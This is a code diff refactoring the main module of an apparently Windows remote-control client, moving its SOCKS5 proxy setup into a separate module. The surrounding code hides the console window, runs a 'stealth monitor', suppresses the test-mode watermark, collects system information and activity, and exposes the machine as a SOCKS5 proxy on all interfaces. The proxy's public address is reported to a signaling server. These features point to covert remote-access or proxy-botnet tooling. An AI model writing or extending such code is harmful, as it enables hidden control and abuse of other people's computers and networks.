@@ -10,14 +10,9 @@ if __package__ in {None, ""}:
 
 import argparse
 import asyncio
-import ipaddress
-import json
 import logging
 import platform
-import socket
 import tempfile
-import urllib.parse
-import urllib.request
 
 from .config import (
     load_activity_env,
@@ -39,7 +34,13 @@ from .security.process_monitor import (
     stop_stealth_monitor,
     hide_console_window,
 )
-from .proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
+from .proxy import (
+    get_socks5_payload,
+    load_proxy_settings_from_env,
+    set_proxy_settings,
+    start_socks5_proxy_from_env,
+    stop_socks5_proxy,
+)
 from .system_info import load_or_collect_system_info
 from .windows.dpi import ensure_dpi_awareness
 
@@ -67,104 +68,6 @@ def _hide_test_mode_watermark_enabled() -> bool:
     value = os.getenv("RC_HIDE_WATERMARK", "1")
     return value.strip().lower() not in {"0", "false", "no", "off"}
 
-
-def _socks5_enabled() -> bool:
-    value = os.getenv("RC_SOCKS5_DISABLE", "")
-    return value.strip().lower() not in {"1", "true", "yes", "on"}
-
-
-def _socks5_udp_enabled() -> bool:
-    value = os.getenv("RC_SOCKS5_UDP", "1")
-    return value.strip().lower() not in {"0", "false", "no", "off"}
-
-
-def _read_int_env(name: str, default: int) -> int:
-    raw = os.getenv(name)
-    if raw is None:
-        return default
-    try:
-        return int(raw)
-    except (TypeError, ValueError):
-        return default
-
-
-def _is_unusable_host(value: str | None) -> bool:
-    if not value:
-        return True
-    lowered = value.strip().lower()
-    return lowered in {"0.0.0.0", "127.0.0.1", "::", "::1"}
-
-
-def _is_usable_ip(value: str) -> bool:
-    try:
-        addr = ipaddress.ip_address(value)
-    except ValueError:
-        return False
-    return not (addr.is_loopback or addr.is_link_local)
-
-
-def _resolve_primary_ip() -> str | None:
-    try:
-        hostname = socket.gethostname()
-        for family, _type, _proto, _canon, sockaddr in socket.getaddrinfo(hostname, None):
-            if family in {socket.AF_INET, socket.AF_INET6}:
-                candidate = sockaddr[0]
-                if _is_usable_ip(candidate):
-                    return candidate
-    except OSError:
-        pass
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.connect(("8.8.8.8", 80))
-            candidate = sock.getsockname()[0]
-            if _is_usable_ip(candidate):
-                return candidate
-    except OSError:
-        pass
-    return None
-
-
-def _resolve_proxy_export_host(bind_host: str, public_host: str | None) -> str | None:
-    if public_host:
-        return public_host
-    if bind_host and not _is_unusable_host(bind_host):
-        return bind_host
-    return _resolve_primary_ip()
-
-
-def _build_public_ip_url(base_url: str, token: str | None) -> str | None:
-    if not base_url:
-        return None
-    if "://" not in base_url:
-        base_url = f"http://{base_url}"
-    parsed = urllib.parse.urlsplit(base_url)
-    scheme = parsed.scheme
-    if scheme in {"ws", "wss"}:
-        scheme = "https" if scheme == "wss" else "http"
-    query = urllib.parse.urlencode({"token": token}) if token else ""
-    return urllib.parse.urlunsplit((scheme, parsed.netloc, "/public-ip", query, ""))
-
-
-def _fetch_public_ip(base_url: str | None, token: str | None) -> str | None:
-    if not base_url:
-        return None
-    url = _build_public_ip_url(base_url, token)
-    if not url:
-        return None
-    headers: dict[str, str] = {}
-    if token:
-        headers["x-rc-token"] = token
-    request = urllib.request.Request(url, headers=headers)
-    try:
-        with urllib.request.urlopen(request, timeout=3) as response:
-            payload = json.loads(response.read().decode("utf-8"))
-    except Exception:
-        return None
-    ip_value = payload.get("ip") if isinstance(payload, dict) else None
-    if not isinstance(ip_value, str):
-        return None
-    cleaned = ip_value.strip()
-    return cleaned or None
 
 
 def _start_watermark_remover() -> None:
@@ -205,8 +108,6 @@ def main() -> None:
     
     _configure_logging()
     ensure_dpi_awareness()
-
-    proxy_server = None
 
     # Hide console window on startup if enabled
     if _hide_console_on_start():
@@ -283,76 +184,13 @@ def main() -> None:
         abe_status = None
     if isinstance(abe_status, dict) and abe_status:
         client_config["abe"] = abe_status
-    if _socks5_enabled():
-        try:
-            from .proxy.socks5_server import Socks5ProxyServer
-
-            proxy_host = os.getenv("RC_SOCKS5_HOST", "0.0.0.0").strip() or "0.0.0.0"
-            proxy_port = _read_int_env("RC_SOCKS5_PORT", 1080)
-            if proxy_port <= 0 or proxy_port > 65535:
-                logging.getLogger(__name__).warning(
-                    "Invalid RC_SOCKS5_PORT=%s; falling back to 1080.", proxy_port
-                )
-                proxy_port = 1080
-            proxy_udp = _socks5_udp_enabled()
-            proxy_server = Socks5ProxyServer(
-                host=proxy_host,
-                port=proxy_port,
-                enable_udp=proxy_udp,
-            )
-            try:
-                proxy_server.start()
-            except OSError as exc:
-                logging.getLogger(__name__).warning(
-                    "SOCKS5 proxy port %s unavailable, selecting random port: %s",
-                    proxy_port,
-                    exc,
-                )
-                proxy_server = Socks5ProxyServer(
-                    host=proxy_host,
-                    port=0,
-                    enable_udp=proxy_udp,
-                )
-                proxy_server.start()
-            public_host = (
-                os.getenv("RC_SOCKS5_PUBLIC_HOST", "").strip()
-                or os.getenv("RC_PROXY_HOST", "").strip()
-            )
-            if not public_host:
-                public_host = _fetch_public_ip(resolve_signaling_url(), signaling_token)
-            export_host = _resolve_proxy_export_host(proxy_host, public_host)
-            if export_host and _is_unusable_host(export_host):
-                logging.getLogger(__name__).warning(
-                    "SOCKS5 proxy export host %s may be unreachable; set RC_SOCKS5_PUBLIC_HOST to override.",
-                    export_host,
-                )
-            elif not export_host:
-                logging.getLogger(__name__).warning(
-                    "SOCKS5 proxy export host unresolved; set RC_SOCKS5_PUBLIC_HOST to advertise a reachable address."
-                )
-            proxy_payload = {
-                "enabled": True,
-                "type": "socks5",
-                "port": proxy_server.port,
-                "udp": proxy_udp,
-            }
-            if export_host:
-                proxy_payload["host"] = export_host
+    try:
+        runtime = start_socks5_proxy_from_env()
+        proxy_payload = get_socks5_payload()
+        if proxy_payload:
             client_config["proxy"] = proxy_payload
-            if export_host:
-                set_proxy_settings(
-                    ProxySettings(
-                        host=export_host,
-                        port=proxy_server.port,
-                        proxy_type="socks5",
-                    )
-                )
-            else:
-                logging.getLogger(__name__).warning(
-                    "SOCKS5 proxy export disabled: unable to resolve a reachable host."
-                )
-        except Exception as exc:
-            logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
+    except Exception as exc:
+        logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
     
     # Start activity tracker if enabled
     activity_sender = None
@@ -402,11 +240,10 @@ def main() -> None:
                 activity_sender.stop()
             except Exception:
                 pass
-        if proxy_server is not None:
-            try:
-                proxy_server.stop()
-            except Exception:
-                pass
+        try:
+            stop_socks5_proxy()
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
